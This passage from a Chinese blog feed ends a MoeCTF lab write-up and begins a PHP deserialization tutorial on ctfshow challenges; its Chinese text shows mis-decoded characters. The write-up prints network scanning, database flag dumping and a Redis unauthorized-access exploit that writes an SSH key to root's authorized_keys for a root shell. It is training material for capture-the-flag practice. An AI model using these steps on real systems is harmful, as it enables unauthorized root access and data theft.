class="token keyword">print</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span></code></pre><p>å¾—åˆ°ipä¸º<code>172.21.0.2</code>ã€‚æ‰«æï¼š</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"/app/tools/fscan -h 127.21.0.2/24"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°hint.zipå¯†ç ï¼š 22-3306-6379-8080</p><p>ç„¶åä¸è¦å¡åœ¨æ€ä¹ˆé…ç½®frpè¿›è¡Œå†…ç½‘ç©¿é€ï¼Œé‚£ä¸ªè¦è‡ªå·±å¼€vpsï¼Œæˆ–è€…è¦æœ‰ä¸ªè‡ªå·±çš„å…¬ç½‘ipã€‚ç©¿é€åªæ˜¯è¾…åŠ©æ•ˆæœï¼Œå¸®åŠ©æˆ‘ä»¬æ¸—é€æ›´åŠ æ–¹ä¾¿ï¼Œä¸é…ç½®ç›´æ¥ç”¨python consoleä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ä¹Ÿä¸è¦æƒ³ç”¨ngrokå…è´¹ç‰ˆï¼Œå…è´¹ç‰ˆåªèƒ½è½¬å‘ä¸€ä¸ªç«¯å£ï¼Œè€Œç©¿é€è‡³å°‘è¦ä¸¤ä¸ªç«¯å£ã€‚ç›´æ¥å»æmysqlï¼š</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"cat dataSql.py"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°sqlæ•°æ®åº“äº¤äº’çš„æºç ï¼Œé‡Œé¢æœ‰ç”¨æˆ·åå’Œå¯†ç ã€‚è¿æ¥:</p><pre class="language-python" data-language="python"><code class="language-python">db <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"mysql"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span>passwd<span class="token operator">=</span><span class="token string">"The_P0sswOrD_Y0u_Nev3r_Kn0w"</span><span class="token punctuation">,</span>database<span class="token operator">=</span><span class="token string">"messageboard"</span><span class="token punctuation">,</span>charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span></code></pre><p>æŸ¥å†…å®¹ï¼š</p><pre class="language-python" data-language="python"><code class="language-python">cursor<span class="token operator">=</span>db<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select database()"</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'messageboard'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(table_name))from(information_schema.tables)where(table_schema)='messageboard'"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'flag,message,users'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(flag))from(flag)"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'-Are-YOu-myS0L-MasT3r?-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æœ€åæ˜¯redisã€‚ç”¨pythonè£…ä¸ªredisæ¨¡å—ï¼ˆä¸çŸ¥é“ä¸ºå•¥apt-get installè£…ä¸äº†ï¼Ÿï¼‰ï¼š</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"pip3 install redis"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>ç„¶åè¿æ¥</p><pre class="language-python" data-language="python"><code class="language-python">r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'172.20.0.3'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ä»infoä¸­å¾—çŸ¥rediså­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ã€‚æ ¹æ® https:&#x2F;&#x2F;_thorns.gitbooks.io&#x2F;sec&#x2F;content&#x2F;redis_getshellzi_dong_hua_shi_jian_zhi_ssh_key.html å¾€rootå†™ssh keyã€‚public_keyå’Œprivkeyåˆ©ç”¨<code>ssh-keygen -t rsa</code>ç”Ÿæˆ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'aaaaaaaaaa'</span><span class="token punctuation">,</span> <span class="token string">'\n\n'</span> <span class="token operator">+</span> public_key <span class="token operator">+</span> <span class="token string">'\n\n'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'/root/.ssh'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dbfilename'</span><span class="token punctuation">,</span> <span class="token string">'authorized_keys'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token boolean">True</span></code></pre><p>å‚è€ƒ <a href="https://www.cnblogs.com/wongbingming/articles/12384764.html">https://www.cnblogs.com/wongbingming/articles/12384764.html</a> ï¼Œå®‰è£…paramikoè¿›è¡Œsshè¿æ¥</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"pip3 install paramiko"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">import</span> paramiko<span class="token operator">>></span><span class="token operator">></span> pkey <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>RSAKey<span class="token punctuation">.</span>from_private_key_file<span class="token punctuation">(</span><span class="token string">'privkey'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> trans <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>Transport<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'172.20.0.3'</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> trans<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>username<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span> pkey<span class="token operator">=</span>pkey<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> ssh <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> ssh<span class="token punctuation">.</span>_transport <span class="token operator">=</span> trans<span class="token operator">>></span><span class="token operator">></span> stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p> <strong>Flag</strong></p><blockquote><p>moectf{Information-leakage-Is-dangerous!-Are-YOu-myS0L-MasT3r?-P@sSW0Rd-F0r-redis-Is-NeceSsary}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> MoeCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-php_unserialize</title>
      <link href="/2024/07/13/web%E5%85%A5%E9%97%A8-php_unserialize/"/>
      <url>/2024/07/13/web%E5%85%A5%E9%97%A8-php_unserialize/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p><a href="https://hello-ctf.com/HC_Web/php_unser_base/">PHP åºåˆ—åŒ–åŠååºåˆ—åŒ–åŸºç¡€</a></p><p><a href="https://blog.csdn.net/jayq1/article/details/131858372">ååºåˆ—åŒ–å­¦ä¹ ç¬”è®°</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/113588692">[CTF]PHPååºåˆ—åŒ–æ€»ç»“</a></p><h4 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h4><p>åœ¨ PHP çš„åºåˆ—åŒ–ä¸­ï¼Œé­”æœ¯æ–¹æ³•ï¼ˆMagic Methodsï¼‰æ˜¯ä¸€ç»„ç‰¹æ®Šçš„æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•ä»¥åŒä¸‹åˆ’çº¿ï¼ˆ<code>__</code>ï¼‰ä½œä¸ºå‰ç¼€ï¼Œå¯ä»¥åœ¨ç‰¹å®šçš„åºåˆ—åŒ–é˜¶æ®µè§¦å‘ä»è€Œä½¿å¼€å‘è€…èƒ½å¤Ÿè¿›ä¸€æ­¥çš„æ§åˆ¶ åºåˆ—åŒ– &#x2F; ååºåˆ—åŒ– çš„è¿‡ç¨‹ã€‚</p><p>ä½ å¯ä»¥åœ¨ PHP å®˜æ–¹æ–‡æ¡£ä¸­æŸ¥æ‰¾åˆ°å¯¹åº”é­”æœ¯æ–¹æ³•çš„å®šä¹‰å’Œä½¿ç”¨æ–¹æ³•ï¼š<a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP: é­”æœ¯æ–¹æ³• - Manual</a></p><p>ä¸€èˆ¬åœ¨é¢˜ç›®ä¸­å¸¸è§çš„å‡ ä¸ªæ–¹æ³•å¦‚ä¸‹ï¼š</p><pre class="language-none"><code class="language-none">__wakeup() &#x2F;&#x2F;------ æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°__sleep() &#x2F;&#x2F;------- æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°__destruct() &#x2F;&#x2F;---- å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__call() &#x2F;&#x2F;-------- åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__callStatic() &#x2F;&#x2F;-- åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get() &#x2F;&#x2F;--------- ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®æˆ–è€…ä¸å­˜åœ¨è¿™ä¸ªé”®éƒ½ä¼šè°ƒç”¨æ­¤æ³•__set() &#x2F;&#x2F;--------- ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§__isset() &#x2F;&#x2F;------- åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset() &#x2F;&#x2F;------- åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__toString() &#x2F;&#x2F;---- æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘__invoke() &#x2F;&#x2F;------ å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</code></pre><p>ä¸€ä»½æ¯”è¾ƒå…¨é¢çš„è¡¨æ ¼ï¼š</p><table><thead><tr><th align="left">magicMethods</th><th align="left">attribute</th></tr></thead><tbody><tr><td align="left">__construct</td><td align="left">å½“ä¸€ä¸ªå¯¹è±¡è¢«åˆ›å»ºæ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥åˆå§‹åŒ–å¯¹è±¡çš„å±æ€§ã€‚</td></tr><tr><td align="left">__destruct</td><td align="left">å½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥é‡Šæ”¾å¯¹è±¡å ç”¨çš„èµ„æºã€‚</td></tr><tr><td align="left">__call</td><td align="left">åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°åŠ¨æ€æ–¹æ³•è°ƒç”¨ã€‚</td></tr><tr><td align="left">__callStatic</td><td align="left">åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°åŠ¨æ€é™æ€æ–¹æ³•è°ƒç”¨ã€‚</td></tr><tr><td align="left">__get</td><td align="left">å½“ä¸€ä¸ªå¯¹è±¡çš„å±æ€§è¢«è¯»å–æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å±æ€§çš„è®¿é—®æ§åˆ¶ã€‚</td></tr><tr><td align="left">__set</td><td align="left">å½“ä¸€ä¸ªå¯¹è±¡çš„å±æ€§è¢«è®¾ç½®æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å±æ€§çš„è®¿é—®æ§åˆ¶ã€‚</td></tr><tr><td align="left">__isset</td><td align="left">å½“ä½¿ç”¨ isset() æˆ– empty() æµ‹è¯•ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å±æ€§çš„è®¿é—®æ§åˆ¶ã€‚</td></tr><tr><td align="left">__unset</td><td align="left">å½“ä½¿ç”¨ unset() åˆ é™¤ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å±æ€§çš„è®¿é—®æ§åˆ¶ã€‚</td></tr><tr><td align="left">__toString</td><td align="left">å½“ä¸€ä¸ªå¯¹è±¡è¢«è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚</td></tr><tr><td align="left">__invoke</td><td align="left">å½“ä¸€ä¸ªå¯¹è±¡è¢«ä½œä¸ºå‡½æ•°è°ƒç”¨æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å¯¹è±¡çš„å¯è°ƒç”¨æ€§ã€‚</td></tr><tr><td align="left">__set_state</td><td align="left">å½“ä½¿ç”¨ var_export() å¯¼å‡ºä¸€ä¸ªå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</td></tr><tr><td align="left">__clone</td><td align="left">å½“ä¸€ä¸ªå¯¹è±¡è¢«å…‹éš†æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å¯¹è±¡çš„å…‹éš†ã€‚</td></tr><tr><td align="left">__debugInfo</td><td align="left">å½“ä½¿ç”¨ var_dump() æˆ– print_r() è¾“å‡ºä¸€ä¸ªå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥æ§åˆ¶å¯¹è±¡çš„è°ƒè¯•ä¿¡æ¯è¾“å‡ºã€‚</td></tr><tr><td align="left">__sleep</td><td align="left">åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥æ§åˆ¶å“ªäº›å±æ€§è¢«åºåˆ—åŒ–ã€‚</td></tr><tr><td align="left">__wakeup</td><td align="left">åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–ä¹‹åè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥é‡æ–°åˆå§‹åŒ–å¯¹è±¡çš„å±æ€§ã€‚</td></tr></tbody></table><p>PHP å®˜æ–¹æ–‡æ¡£å·²ç»å¾ˆè¯¦ç»†äº†ï¼Œè¿™é‡Œä¸åœ¨èµ˜è¿°ï¼Œä¸ä¸€å®šéœ€è¦å­¦ä¼šæ‰€æœ‰çš„å‡½æ•°ï¼Œé™¤å¼€å¸¸è§çš„ï¼Œå…¶ä»–çš„åœ¨é‡åˆ°çš„æ—¶å€™æŸ¥é˜…å³å¯ã€‚</p><h3 id="web254-278"><a href="#web254-278" class="headerlink" title="web254-278"></a>web254-278</h3><h4 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>åªè¦è§¦å‘**vipOneKeyGetFlag()**å‡½æ•°å°±å¯ä»¥å¾—åˆ°flag</p><p>è€ƒå¯ŸåŸºç¡€çš„ä»£ç å®¡è®¡ï¼Œæ»¡è¶³<code>$this-&gt;username===$u&amp;&amp;$this-&gt;password===$p</code>å³å¯</p><h4 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token 